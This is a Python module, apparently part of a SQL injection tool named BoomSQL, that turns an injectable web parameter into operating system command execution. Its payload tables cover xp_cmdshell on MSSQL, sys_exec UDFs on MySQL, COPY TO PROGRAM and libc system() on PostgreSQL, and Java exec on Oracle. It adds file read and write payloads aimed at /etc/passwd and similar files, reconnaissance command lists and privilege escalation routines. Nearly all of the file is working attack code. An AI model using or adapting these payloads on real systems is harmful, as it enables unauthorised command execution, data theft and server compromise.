"""
OS Command Execution Module for BoomSQL
Provides operating system command execution capabilities through SQL injection
"""

import asyncio
import aiohttp
import logging
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass
from enum import Enum
import re
import base64
import urllib.parse

from .sql_injection_engine import DatabaseType, VulnerabilityResult
from .enhanced_network import EnhancedNetworkManager

class OSCommandTechnique(Enum):
    """OS command execution techniques"""
    XP_CMDSHELL = "xp_cmdshell"  # MSSQL
    SHELL_EXEC = "shell_exec"    # MySQL
    SYSTEM_FUNC = "system_func"  # PostgreSQL
    JAVA_EXEC = "java_exec"      # Oracle
    INTO_OUTFILE = "into_outfile"  # File-based
    LOAD_FILE = "load_file"      # File reading
    STACKED_QUERIES = "stacked_queries"

class OSCommandResult:
    """Result of OS command execution"""
    
    def __init__(self):
        self.success = False
        self.output = ""
        self.error = ""
        self.technique = None
        self.command = ""
        self.execution_time = 0.0

@dataclass
class FileSystemAccess:
    """File system access information"""
    can_read: bool
    can_write: bool
    can_execute: bool
    accessible_paths: List[str]
    writable_paths: List[str]
    
class OSCommandExecutor:
    """OS command execution engine"""
    
    def __init__(self, network_manager: EnhancedNetworkManager):
        self.network_manager = network_manager
        self.logger = logging.getLogger(__name__)
        
        # Command execution payloads for different database types
        self.command_payloads = {
            DatabaseType.MSSQL: {
                OSCommandTechnique.XP_CMDSHELL: [
                    "EXEC master.dbo.xp_cmdshell '{command}'",
                    "EXEC master..xp_cmdshell '{command}'",
                    "EXECUTE master.dbo.xp_cmdshell '{command}'"
                ],
                OSCommandTechnique.SHELL_EXEC: [
                    "EXEC master.dbo.sp_configure 'show advanced options', 1; RECONFIGURE; EXEC master.dbo.sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master.dbo.xp_cmdshell '{command}'"
                ]
            },
            DatabaseType.MYSQL: {
                OSCommandTechnique.SHELL_EXEC: [
                    "SELECT sys_exec('{command}')",
                    "SELECT sys_eval('{command}')",
                    "SELECT @@version_compile_os"
                ],
                OSCommandTechnique.INTO_OUTFILE: [
                    "SELECT '{command}' INTO OUTFILE '/tmp/boom_cmd.sh'",
                    "SELECT 'chmod +x /tmp/boom_cmd.sh; /tmp/boom_cmd.sh' INTO OUTFILE '/tmp/boom_exec.sh'"
                ]
            },
            DatabaseType.POSTGRESQL: {
                OSCommandTechnique.SYSTEM_FUNC: [
                    "COPY (SELECT '{command}') TO PROGRAM 'bash'",
                    "SELECT system('{command}')",
                    "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('{command}');"
                ]
            },
            DatabaseType.ORACLE: {
                OSCommandTechnique.JAVA_EXEC: [
                    "SELECT dbms_java.runjava_in_current_session('java.lang.Runtime.getRuntime().exec(\"{command}\")') FROM dual",
                    "SELECT dbms_java_test.funcall('java.lang.Runtime.getRuntime().exec(\"{command}\")') FROM dual"
                ]
            }
        }
        
        # File system access payloads
        self.file_payloads = {
            DatabaseType.MYSQL: {
                "read": [
                    "SELECT LOAD_FILE('{file_path}')",
                    "SELECT HEX(LOAD_FILE('{file_path}'))"
                ],
                "write": [
                    "SELECT '{content}' INTO OUTFILE '{file_path}'",
                    "SELECT '{content}' INTO DUMPFILE '{file_path}'"
                ],
                "list": [
                    "SELECT @@datadir",
                    "SELECT @@tmpdir",
                    "SELECT @@plugin_dir"
                ]
            },
            DatabaseType.MSSQL: {
                "read": [
                    "SELECT * FROM OPENROWSET(BULK '{file_path}', SINGLE_BLOB) AS x",
                    "EXEC master.dbo.xp_cmdshell 'type {file_path}'"
                ],
                "write": [
                    "EXEC master.dbo.xp_cmdshell 'echo {content} > {file_path}'",
                    "EXEC xp_cmdshell 'powershell -c \"Set-Content -Path \'{file_path}\' -Value \'{content}\'\""
                ],
                "list": [
                    "EXEC master.dbo.xp_cmdshell 'dir C:\\'",
                    "EXEC master.dbo.xp_cmdshell 'dir %TEMP%'"
                ]
            },
            DatabaseType.POSTGRESQL: {
                "read": [
                    "SELECT pg_read_file('{file_path}')",
                    "SELECT pg_read_binary_file('{file_path}')"
                ],
                "write": [
                    "COPY (SELECT '{content}') TO '{file_path}'",
                    "SELECT pg_file_write('{file_path}', '{content}', false)"
                ],
                "list": [
                    "SELECT pg_ls_dir('/tmp')",
                    "SELECT pg_ls_dir('/var/log')"
                ]
            }
        }
        
        # Common system commands for different platforms
        self.system_commands = {
            "windows": {
                "info": ["systeminfo", "whoami", "ver", "hostname"],
                "network": ["ipconfig", "netstat -an", "arp -a"],
                "processes": ["tasklist", "wmic process list"],
                "users": ["net user", "net localgroup administrators"],
                "files": ["dir C:\\", "dir %TEMP%", "dir %USERPROFILE%"]
            },
            "linux": {
                "info": ["uname -a", "whoami", "id", "hostname"],
                "network": ["ifconfig", "netstat -an", "ss -tulpn"],
                "processes": ["ps aux", "ps -ef"],
                "users": ["cat /etc/passwd", "groups", "sudo -l"],
                "files": ["ls -la /", "ls -la /tmp", "ls -la /home"]
            }
        }
    
    async def execute_command(self, url: str, vuln: VulnerabilityResult, command: str, 
                            technique: OSCommandTechnique = None) -> OSCommandResult:
        """Execute OS command through SQL injection"""
        start_time = asyncio.get_event_loop().time()
        result = OSCommandResult()
        result.command = command
        
        try:
            # Auto-detect technique if not specified
            if technique is None:
                technique = self._detect_best_technique(vuln.database_type)
            
            result.technique = technique
            
            # Get payloads for database type and technique
            payloads = self.command_payloads.get(vuln.database_type, {}).get(technique, [])
            
            if not payloads:
                result.error = f"No payloads available for {vuln.database_type} with technique {technique}"
                return result
            
            # Try each payload
            for payload in payloads:
                try:
                    # Format payload with command
                    formatted_payload = payload.format(command=command)
                    
                    # Execute payload
                    output = await self._execute_payload(url, vuln, formatted_payload)
                    
                    if output:
                        result.success = True
                        result.output = output
                        break
                        
                except Exception as e:
                    self.logger.debug(f"Command execution failed for payload {payload}: {e}")
                    result.error = str(e)
                    continue
            
            result.execution_time = asyncio.get_event_loop().time() - start_time
            return result
            
        except Exception as e:
            self.logger.error(f"Command execution failed: {e}")
            result.error = str(e)
            result.execution_time = asyncio.get_event_loop().time() - start_time
            return result
    
    async def test_file_access(self, url: str, vuln: VulnerabilityResult) -> FileSystemAccess:
        """Test file system access capabilities"""
        access = FileSystemAccess(
            can_read=False,
            can_write=False,
            can_execute=False,
            accessible_paths=[],
            writable_paths=[]
        )
        
        try:
            # Test read access
            access.can_read = await self._test_file_read(url, vuln)
            
            # Test write access
            access.can_write = await self._test_file_write(url, vuln)
            
            # Test execute access
            access.can_execute = await self._test_command_execution(url, vuln)
            
            # Find accessible paths
            if access.can_read:
                access.accessible_paths = await self._find_accessible_paths(url, vuln)
            
            # Find writable paths
            if access.can_write:
                access.writable_paths = await self._find_writable_paths(url, vuln)
            
            return access
            
        except Exception as e:
            self.logger.error(f"File access test failed: {e}")
            return access
    
    async def read_file(self, url: str, vuln: VulnerabilityResult, file_path: str) -> str:
        """Read file content through SQL injection"""
        try:
            # Get read payloads for database type
            payloads = self.file_payloads.get(vuln.database_type, {}).get("read", [])
            
            for payload in payloads:
                try:
                    # Format payload with file path
                    formatted_payload = payload.format(file_path=file_path)
                    
                    # Execute payload
                    content = await self._execute_payload(url, vuln, formatted_payload)
                    
                    if content:
                        return content
                        
                except Exception as e:
                    self.logger.debug(f"File read failed for payload {payload}: {e}")
                    continue
            
            return ""
            
        except Exception as e:
            self.logger.error(f"File read failed: {e}")
            return ""
    
    async def write_file(self, url: str, vuln: VulnerabilityResult, file_path: str, content: str) -> bool:
        """Write file content through SQL injection"""
        try:
            # Get write payloads for database type
            payloads = self.file_payloads.get(vuln.database_type, {}).get("write", [])
            
            for payload in payloads:
                try:
                    # Format payload with file path and content
                    formatted_payload = payload.format(file_path=file_path, content=content)
                    
                    # Execute payload
                    result = await self._execute_payload(url, vuln, formatted_payload)
                    
                    # Check if write was successful
                    if result is not None:
                        return True
                        
                except Exception as e:
                    self.logger.debug(f"File write failed for payload {payload}: {e}")
                    continue
            
            return False
            
        except Exception as e:
            self.logger.error(f"File write failed: {e}")
            return False
    
    async def get_system_info(self, url: str, vuln: VulnerabilityResult) -> Dict[str, Any]:
        """Get system information through command execution"""
        system_info = {
            "os": "unknown",
            "architecture": "unknown",
            "hostname": "unknown",
            "user": "unknown",
            "privileges": [],
            "network": {},
            "processes": [],
            "files": []
        }
        
        try:
            # Detect OS first
            os_type = await self._detect_os(url, vuln)
            system_info["os"] = os_type
            
            # Get commands for detected OS
            commands = self.system_commands.get(os_type, {})
            
            # Execute info commands
            for info_cmd in commands.get("info", []):
                result = await self.execute_command(url, vuln, info_cmd)
                if result.success:
                    if "uname" in info_cmd or "systeminfo" in info_cmd:
                        system_info["architecture"] = result.output[:100]
                    elif "whoami" in info_cmd:
                        system_info["user"] = result.output.strip()
                    elif "hostname" in info_cmd:
                        system_info["hostname"] = result.output.strip()
            
            # Execute network commands
            for net_cmd in commands.get("network", []):
                result = await self.execute_command(url, vuln, net_cmd)
                if result.success:
                    system_info["network"][net_cmd] = result.output[:500]
            
            # Execute process commands
            for proc_cmd in commands.get("processes", []):
                result = await self.execute_command(url, vuln, proc_cmd)
                if result.success:
                    system_info["processes"].append(result.output[:500])
            
            return system_info
            
        except Exception as e:
            self.logger.error(f"System info gathering failed: {e}")
            return system_info
    
    async def escalate_privileges(self, url: str, vuln: VulnerabilityResult) -> Dict[str, Any]:
        """Attempt privilege escalation"""
        escalation_result = {
            "success": False,
            "technique": None,
            "new_privileges": [],
            "evidence": []
        }
        
        try:
            # Database-specific privilege escalation
            if vuln.database_type == DatabaseType.MSSQL:
                escalation_result = await self._escalate_mssql_privileges(url, vuln)
            elif vuln.database_type == DatabaseType.MYSQL:
                escalation_result = await self._escalate_mysql_privileges(url, vuln)
            elif vuln.database_type == DatabaseType.POSTGRESQL:
                escalation_result = await self._escalate_postgresql_privileges(url, vuln)
            
            return escalation_result
            
        except Exception as e:
            self.logger.error(f"Privilege escalation failed: {e}")
            escalation_result["error"] = str(e)
            return escalation_result
    
    def _detect_best_technique(self, db_type: DatabaseType) -> OSCommandTechnique:
        """Detect best command execution technique for database type"""
        technique_map = {
            DatabaseType.MSSQL: OSCommandTechnique.XP_CMDSHELL,
            DatabaseType.MYSQL: OSCommandTechnique.SHELL_EXEC,
            DatabaseType.POSTGRESQL: OSCommandTechnique.SYSTEM_FUNC,
            DatabaseType.ORACLE: OSCommandTechnique.JAVA_EXEC
        }
        
        return technique_map.get(db_type, OSCommandTechnique.STACKED_QUERIES)
    
    async def _execute_payload(self, url: str, vuln: VulnerabilityResult, payload: str) -> Optional[str]:
        """Execute SQL payload and return output"""
        try:
            # Build injection URL
            injection_url = self._build_injection_url(url, vuln, payload)
            
            # Send request
            response = await self.network_manager.get(injection_url)
            
            # Extract output from response
            output = self._extract_command_output(response.text)
            
            return output
            
        except Exception as e:
            self.logger.debug(f"Payload execution failed: {e}")
            return None
    
    def _build_injection_url(self, url: str, vuln: VulnerabilityResult, payload: str) -> str:
        """Build injection URL with payload"""
        if vuln.parameter_type == "GET":
            # URL parameter injection
            if "?" in url:
                if f"{vuln.parameter}=" in url:
                    # Replace existing parameter
                    pattern = f"{vuln.parameter}=[^&]*"
                    encoded_payload = urllib.parse.quote(payload)
                    replacement = f"{vuln.parameter}={encoded_payload}"
                    return re.sub(pattern, replacement, url)
                else:
                    # Add new parameter
                    encoded_payload = urllib.parse.quote(payload)
                    return f"{url}&{vuln.parameter}={encoded_payload}"
            else:
                encoded_payload = urllib.parse.quote(payload)
                return f"{url}?{vuln.parameter}={encoded_payload}"
        else:
            # For POST parameters, would need to modify request body
            return url
    
    def _extract_command_output(self, response_text: str) -> Optional[str]:
        """Extract command output from response"""
        # Look for common command output patterns
        patterns = [
            r"<pre[^>]*>(.*?)</pre>",  # Pre-formatted text
            r"<code[^>]*>(.*?)</code>",  # Code blocks
            r"Output:\s*(.*?)(?:\n|$)",  # Output: prefix
            r"Result:\s*(.*?)(?:\n|$)",  # Result: prefix
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.DOTALL | re.IGNORECASE)
            if matches:
                return matches[0].strip()
        
        # If no specific patterns found, look for text that looks like command output
        lines = response_text.split('\n')
        for line in lines:
            # Look for lines that might be command output
            if (len(line) > 10 and 
                any(indicator in line.lower() for indicator in ['c:', 'usr', 'root', 'windows', 'linux', 'system'])):
                return line.strip()
        
        return None
    
    async def _test_file_read(self, url: str, vuln: VulnerabilityResult) -> bool:
        """Test file read capability"""
        try:
            # Try to read a common system file
            test_files = {
                DatabaseType.MYSQL: ["/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts"],
                DatabaseType.MSSQL: ["C:\\Windows\\System32\\drivers\\etc\\hosts", "C:\\boot.ini"],
                DatabaseType.POSTGRESQL: ["/etc/passwd", "/proc/version"]
            }
            
            files_to_test = test_files.get(vuln.database_type, ["/etc/passwd"])
            
            for test_file in files_to_test:
                content = await self.read_file(url, vuln, test_file)
                if content and len(content) > 10:
                    return True
            
            return False
            
        except Exception as e:
            self.logger.debug(f"File read test failed: {e}")
            return False
    
    async def _test_file_write(self, url: str, vuln: VulnerabilityResult) -> bool:
        """Test file write capability"""
        try:
            # Try to write to a temporary location
            test_content = "BoomSQL_test_write"
            test_paths = {
                DatabaseType.MYSQL: ["/tmp/boom_test.txt", "C:\\temp\\boom_test.txt"],
                DatabaseType.MSSQL: ["C:\\temp\\boom_test.txt", "C:\\Windows\\temp\\boom_test.txt"],
                DatabaseType.POSTGRESQL: ["/tmp/boom_test.txt", "/var/tmp/boom_test.txt"]
            }
            
            paths_to_test = test_paths.get(vuln.database_type, ["/tmp/boom_test.txt"])
            
            for test_path in paths_to_test:
                success = await self.write_file(url, vuln, test_path, test_content)
                if success:
                    return True
            
            return False
            
        except Exception as e:
            self.logger.debug(f"File write test failed: {e}")
            return False
    
    async def _test_command_execution(self, url: str, vuln: VulnerabilityResult) -> bool:
        """Test command execution capability"""
        try:
            # Try simple commands
            test_commands = ["whoami", "id", "ver", "hostname"]
            
            for command in test_commands:
                result = await self.execute_command(url, vuln, command)
                if result.success and len(result.output) > 0:
                    return True
            
            return False
            
        except Exception as e:
            self.logger.debug(f"Command execution test failed: {e}")
            return False
    
    async def _detect_os(self, url: str, vuln: VulnerabilityResult) -> str:
        """Detect operating system"""
        try:
            # Try OS detection commands
            windows_commands = ["ver", "systeminfo", "echo %OS%"]
            linux_commands = ["uname -a", "cat /proc/version", "lsb_release -a"]
            
            # Test Windows commands
            for cmd in windows_commands:
                result = await self.execute_command(url, vuln, cmd)
                if result.success and any(indicator in result.output.lower() 
                                        for indicator in ['windows', 'microsoft', 'dos']):
                    return "windows"
            
            # Test Linux commands
            for cmd in linux_commands:
                result = await self.execute_command(url, vuln, cmd)
                if result.success and any(indicator in result.output.lower() 
                                        for indicator in ['linux', 'unix', 'gnu']):
                    return "linux"
            
            return "unknown"
            
        except Exception as e:
            self.logger.debug(f"OS detection failed: {e}")
            return "unknown"
    
    async def _find_accessible_paths(self, url: str, vuln: VulnerabilityResult) -> List[str]:
        """Find accessible file paths"""
        accessible_paths = []
        
        # Common paths to test
        test_paths = [
            "/etc", "/tmp", "/var", "/home", "/usr",
            "C:\\", "C:\\Windows", "C:\\temp", "C:\\Users"
        ]
        
        for path in test_paths:
            try:
                # Try to list directory or read path
                result = await self.execute_command(url, vuln, f"ls -la {path}")
                if not result.success:
                    result = await self.execute_command(url, vuln, f"dir {path}")
                
                if result.success:
                    accessible_paths.append(path)
                    
            except Exception as e:
                self.logger.debug(f"Path access test failed for {path}: {e}")
                continue
        
        return accessible_paths
    
    async def _find_writable_paths(self, url: str, vuln: VulnerabilityResult) -> List[str]:
        """Find writable file paths"""
        writable_paths = []
        
        # Common writable paths
        test_paths = [
            "/tmp", "/var/tmp", "/dev/shm",
            "C:\\temp", "C:\\Windows\\temp", "C:\\Users\\Public"
        ]
        
        for path in test_paths:
            try:
                # Try to write test file
                test_file = f"{path}/boom_write_test.txt"
                success = await self.write_file(url, vuln, test_file, "test")
                
                if success:
                    writable_paths.append(path)
                    
            except Exception as e:
                self.logger.debug(f"Write test failed for {path}: {e}")
                continue
        
        return writable_paths
    
    async def _escalate_mssql_privileges(self, url: str, vuln: VulnerabilityResult) -> Dict[str, Any]:
        """Attempt MSSQL privilege escalation"""
        result = {"success": False, "technique": "mssql_escalation", "evidence": []}
        
        try:
            # Try to enable xp_cmdshell
            enable_commands = [
                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
            ]
            
            for cmd in enable_commands:
                cmd_result = await self.execute_command(url, vuln, cmd)
                if cmd_result.success:
                    result["evidence"].append(f"Executed: {cmd}")
                    result["success"] = True
            
            return result
            
        except Exception as e:
            result["error"] = str(e)
            return result
    
    async def _escalate_mysql_privileges(self, url: str, vuln: VulnerabilityResult) -> Dict[str, Any]:
        """Attempt MySQL privilege escalation"""
        result = {"success": False, "technique": "mysql_escalation", "evidence": []}
        
        try:
            # Try to create user-defined functions
            udf_commands = [
                "CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so';",
                "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';"
            ]
            
            for cmd in udf_commands:
                cmd_result = await self.execute_command(url, vuln, cmd)
                if cmd_result.success:
                    result["evidence"].append(f"Created UDF: {cmd}")
                    result["success"] = True
            
            return result
            
        except Exception as e:
            result["error"] = str(e)
            return result
    
    async def _escalate_postgresql_privileges(self, url: str, vuln: VulnerabilityResult) -> Dict[str, Any]:
        """Attempt PostgreSQL privilege escalation"""
        result = {"success": False, "technique": "postgresql_escalation", "evidence": []}
        
        try:
            # Try to create C functions
            c_function = """
            CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS 
            '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
            """
            
            cmd_result = await self.execute_command(url, vuln, c_function)
            if cmd_result.success:
                result["evidence"].append("Created system() function")
                result["success"] = True
            
            return result
            
        except Exception as e:
            result["error"] = str(e)
            return result
